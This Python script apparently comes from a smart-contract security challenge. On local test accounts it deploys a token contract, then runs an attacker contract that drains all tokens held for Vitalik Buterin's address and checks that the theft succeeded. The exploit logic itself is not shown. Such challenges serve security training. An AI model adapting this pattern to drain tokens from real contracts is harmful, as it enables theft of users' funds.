from ape import accounts, project
from .utils.helper import w3

VITALIK_ADDRESS = "0xd8dA6BF26964aF9D7eEd9e03E53415D37aA96045"
VITALIK_TOKENS = w3.to_wei(100, "ether")


def main():
    # --- BEFORE EXPLOIT --- #
    print("\n--- Setting up scenario ---\n")

    # get accounts
    deployer = accounts.test_accounts[0]
    attacker = accounts.test_accounts[1]

    # deploy token
    print("\n--- Deploying VToken ---\n")
    v_token = project.VToken.deploy(sender=deployer)
    assert v_token.balanceOf(VITALIK_ADDRESS) == VITALIK_TOKENS

    # define initial balances for attacker and vitalik
    attacker_initial_bal = v_token.balanceOf(attacker.address) / 10**18
    vitalik_initial_bal = v_token.balanceOf(VITALIK_ADDRESS) / 10**18

    print(
        f"\n--- \nInitial Balances:\n⇒ Attacker: {attacker_initial_bal}\n⇒ Vitalik: {vitalik_initial_bal}\n---\n"
    )

    # --- EXPLOIT GOES HERE --- #
    print("\n--- Initiating exploit... ---\n")

    # exploit
    attacker_contract = project.VTokenAttacker.deploy(
        v_token.address,
        VITALIK_ADDRESS,
        sender=attacker,
    )
    attacker_contract.attack(sender=attacker)

    # --- AFTER EXPLOIT --- #
    print("\n--- After exploit: Stole all v_token tokens from vitalik contract ---\n")

    # define ending balances for attacker and vitalik
    attacker_final_bal = v_token.balanceOf(attacker.address) / 10**18
    vitalik_final_bal = v_token.balanceOf(VITALIK_ADDRESS) / 10**18

    print(
        f"\n--- \nFinal Balances:\n⇒ Attacker: {attacker_final_bal}\n⇒ Vitalik: {vitalik_final_bal}\n---\n"
    )

    assert v_token.balanceOf(VITALIK_ADDRESS) == 0
    assert v_token.balanceOf(attacker.address) == VITALIK_TOKENS

    print("\n--- 🥂 Challenge Completed! 🥂---\n")


if __name__ == "__main__":
    main()
